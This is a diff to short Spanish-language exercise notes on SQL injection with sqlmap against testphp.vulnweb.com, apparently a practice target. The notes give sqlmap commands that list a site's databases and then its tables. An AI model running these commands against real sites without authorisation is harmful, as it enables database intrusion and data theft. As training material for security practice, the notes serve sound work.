@@ -1,9 +1,17 @@
 ++ Sitio vulnerable: http://testphp.vulnweb.com/
+--- url (específico): sqlmap -u test.php.vulnweb.com/artists.php?artist= 1
 
-++ Ejercicio_1 Obtener el nombre de la base de datos
+++ Ejercicio_1 Obtener el nombre de las bases de datos
 --- sqlmap -u <url> --dbs
 --- y
 --- Enter 
+--- Aparecerán un listado de las bases de datos disponibles
+
+++ Ejercicio_2 Obtener las tablas que conformarn la base de datos
+--- sqlmap -u <url> -D <nombre_base_de_datos> --tables
+
+
+
 
 
 
